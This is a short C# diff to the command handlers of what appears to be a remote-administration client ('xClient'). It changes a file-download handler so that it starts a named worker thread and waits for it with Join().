@@ -130,7 +130,7 @@ namespace xClient.Core.Commands
                 return;
             }
 
-            new Thread(() =>
+            var thr = new Thread(() =>
             {
                 _limitThreads.WaitOne();
                 try
@@ -170,7 +170,9 @@ namespace xClient.Core.Commands
                         .Execute(client);
                 }
                 _limitThreads.Release();
-            }).Start();
+            });
+            thr.Start();
+            thr.Join();
         }
 
         public static void HandleDoDownloadFileCancel(Packets.ServerPackets.DoDownloadFileCancel command, Client client)
